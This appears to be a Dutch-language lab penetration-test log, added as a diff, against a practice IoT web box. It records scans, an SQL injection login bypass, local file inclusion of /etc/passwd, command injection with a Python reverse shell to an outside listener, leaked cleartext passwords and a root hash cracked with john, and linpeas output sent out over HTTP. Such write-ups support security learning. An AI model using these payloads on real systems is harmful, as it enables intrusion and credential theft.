@@ -1,0 +1,172 @@
+nmap scan ->
+open ports:     80      http
+                443     tcpwrapped
+                22      ssh
+                23      telnet
+                5683    tcpwrapped
+http : 80 -> login page (Apache/2.4.54 (Unix))
+nikto -> 
+---------------------------------------------------------------------------
++ Target IP:          192.168.0.185
++ Target Hostname:    192.168.0.185
++ Target Port:        80
++ Start Time:         2022-10-21 06:27:35 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.54 (Unix)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Root page / redirects to: /login
++ Allowed HTTP Methods: OPTIONS, GET, HEAD 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3268: /cgi-bin/: Directory indexing found.
++ OSVDB-3268: /static/: Directory indexing found.
++ 26521 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2022-10-21 06:29:08 (GMT-4) (93 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+meest interessant ->    + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+                        + OSVDB-3268: /cgi-bin/: Directory indexing found.
+                        + OSVDB-3268: /static/: Directory indexing found.
+Login page ->   SQLi vunrable (email)
+                lijkt vulnerable voor user enumeration
+                email=' 1=1 --&password=a -> logged in 
+                cookie: .eJwdzjkOwkAMAMC_bJ3C9h5Z85nIp0BIICVQIf5ORD_FfMqWexzXcnnt71jKdvNyKZLYSEZmIvOqXWO4hsWY2FpayyZBkFahAauY2gpanSoPt6hdJ-tgAW09vfJEcodE0QR2EO7m7G6nYk4CZEowcSYjnhWhnJH3Eft_g0uxY8_t9bzH48yh6ejJjatRD2Azl4E5xGiKWM91rnpOy_cHl8ZBGg.Y1J8AA.tE8AXJPkMjP7I7UokcRVFnIGPEE
+profile page -> authorized users:       dohn.joe@gmail.com
+                                        dane.joe@gmail.com
+                                        Dairo.deRuck@rubberducky.org
+                                        Victor.goeman@rubberducky.com
+Sqlmap op login -> db: SQLite
+[2 tables]
++-----------------+
+| login           |
+| sqlite_sequence |
++-----------------+
+Table: login
+[1 entry]
++----+---------------+-----------+
+| id | email         | password  |
++----+---------------+-----------+
+| 1  | admin@iot.com | test12345 |
++----+---------------+-----------+
+Als admin@iot.com ingevoerd wordt met een fout passwoord komt een responce User admin@iot.com does not exist
+User enumeration is dus niet mogelijk.
+vreemd dat dohn.joe@gmail.com, ... niet in de database zitten. Deze namen worden zullen dus ergens anders opgeslaan zijn.
+gobuster:
+gobuster dir -u http://192.168.0.185/ -w /usr/share/wordlists/dirb/common.txt                                                                     1 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.0.185/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/10/21 07:11:34 Starting gobuster in directory enumeration mode
+===============================================================
+/cgi-bin/             (Status: 200) [Size: 516]
+/login                (Status: 200) [Size: 4393]
+/logout               (Status: 302) [Size: 199] [--> /login]
+/profile              (Status: 302) [Size: 231] [--> /login?next=%2Fprofile]
+/server-status        (Status: 403) [Size: 276]                             
+                                                                            
+===============================================================
+2022/10/21 07:11:37 Finished
+===============================================================
+login, profile, logout zijn al bekeken en server-status is forbidden. 
+cgi-bin is beschikbaar en kwam ook voor in de nikto scan -> CVE-2011-3268 (CVSS Score : 10)
+cgi-bin is een common gateway interface en maakt het mogelijk voor scripts om te communiceren met de server.
+Niet direct een manier gevonden om CVE-2011-3268 de gebruiken op de site.
+Proberen in te logen op ssh met de gevonden cridentials -> admin@iot.com:test12345
+ssh admin@192.168.0.185                                                                                                                         100 
+admin@192.168.0.185's password: 
+Permission denied, please try again.
+inloggen met telnet met gebruik van admin:test12345 lukt ook niet
+bij http://192.168.0.185/cgi-bin/run.cgi werkt de parameter test ->
+        http://192.168.0.185/cgi-bin/run.cgi?test=hello%20world -> Your URL path is hello%20world
+bij http://192.168.0.185/cgi-bin/LFI.cgi werkt parameter param
+http://192.168.0.185/cgi-bin/LFI.cgi?param=../etc/passwd geeft 
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+client:x:1000:1000:Linux User,,,:/home/client:/bin/ash
+manager:x:1001:1001:Linux User,,,:/home/manager:/bin/ash
+apache:x:100:101:apache:/var/www:/sbin/nologin
+de users met shell access zijn:
+        root
+        client
+        manager
+http://192.168.0.185/cgi-bin/LFI.cgi?param=../home/client/.ssh/id_rsa
+http://192.168.0.185/cgi-bin/LFI.cgi?param=../home/manager/.ssh/id_rsa
+geven niets terug. 
+fuzz filenames in home directory ->
+ffuf -u http://192.168.0.185/cgi-bin/LFI.cgi?param=/home/manager/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt  -fs 0
+geen resultaten.
+random fuzzen naar files is moeilijk we kunnen proberen om ssh connectie te maken naar de client of manager met passwoord test12345.
+zowel client, manager en root kan niet op ingelogd worden met test12345.
+http://192.168.0.185/cgi-bin/LFI.cgi?param=../etc/ssh/ssh_host_dsa_key.pub -> 
+ssh-dss AAAAB3NzaC1kc3MAAACBAOrKXbe+QdqyVU1wEU1Q9uv+ByhqB1NCYYaUxSNEyh+61wM31c1gEc+HX5RFDtipOMXuRkbif7aj0HrcPIXoyMTqX6b0hk9EBTEf3H5xCWhyvUEPHxGsATe7cNRVOiusypos4cPtmKyIIBPY7AlGqywZ12QxXmcy4h1PByjTkQY7AAAAFQCZzl4OXGH+BM/S2ZjfXR+BvLSjhwAAAIEApVGuI8MU/Ob4Qu4B3HQdBNJhSTvMm+Fv6FruG27aIdL2kZsLTK4P1sDnNpfN+4BXikbUeUfJhJcVcPnHdQ0qZu07y+4lZPO0uRoNn4ZnH3VLMF8nWf1IipO0R4h9y97Y9/2RQyWuPDt48c1TgUj5ytz4dTxtSMaBBl7B/A3EVhwAAACBAK5gUsCCVSUH/THm7mik3c+WdCMYoh3qzsI1dazOH+dy4q7C+jAIdX9iNHzgoFRS4LBU32Ucxm6xNfr576QTST+E+DDX75w/Wuf6AY7j2m7gCpzL/UC0x7GzVsnYe/D6KrmJAFVDiUbrM+1EBYXI3W9Ub9pjpsqrGa5f4m8Nntv0 root@8a8eef580e32
+http://192.168.0.185/cgi-bin/script.cgi?param=--test;id
+geeft code execution. van hieruit kan een reverse shell opgezet worden 
+http://192.168.0.185/cgi-bin/script.cgi?param=--test;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.245.128",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+listening on [any] 9000 ...
+connect to [192.168.245.128] from (UNKNOWN) [192.168.245.1] 8101
+/opt/dvd/services/http/cgi-bin $ ^[[75;34Rwhoami 
+whoami
+apache
+dit geeft ons access aan apache.
+In /home zijn twee users aanwezig een client en manager
+        client ->       .ssh
+        manager ->      .info.txt
+                        log.txt
+vanuit apache hebben we alleen lees access aan .info.txt ->
+root:$6$WQBiS3eMvOMsmsDy$nebw3AB8weP3mqP/1qqcJsN/Xh.CW5S2hsSHMVSxdH5sqEMdJZzzDfmcoBeZeNNh43JqXSquoRES3D4bgxKBy.
+manager:devpass
+client:password1
+dit geeft een cleartext passwoord voor manager en client. Ook geeft dit wat lijkt op een deel van het shadow file met daarin root.
+we kunnen dit proberen in john te steken en brute forcen met de rockyou wordlist. hiervoor moet eerst een unshadown gedaan worden.
+root:x:0:0:root:/root:/bin/ash > passwd
+root:$6$WQBiS3eMvOMsmsDy$nebw3AB8weP3mqP/1qqcJsN/Xh.CW5S2hsSHMVSxdH5sqEMdJZzzDfmcoBeZeNNh43JqXSquoRES3D4bgxKBy. > shadow
+unshadow passwd shadow > pass.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
+Dit zal een tijd duren ondertussen proberen we de cleartext passworden te gebruiken om via ssh in te loggen. 
+Dit lukt niet voor zowel client als manager. Ook via telnet lukt het niet om in te loggen met deze passwords.
+we downloaden linpeas op de box en sturen de output naar linpeas.txt. 
+        -> wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+        -> chmod +x linpeas.sh
+        -> ./linpeas.sh > linpeas.txt
+vervolgens exporten we het bestand naar onze vm door een http server op te zetten op poort 443 (de ander poorten zijn filtert aangezien het een docker box is)
+        -> python3 -m http.server 443
+        -> (vm) wget http://192.168.0.185:443/linpeas.txt
+        -> cat linpeas.txt
+ CVEs Check
+Potentially Vulnerable to CVE-2022-2588                                                                                                                   
+-> https://github.com/Markakd/CVE-2022-2588
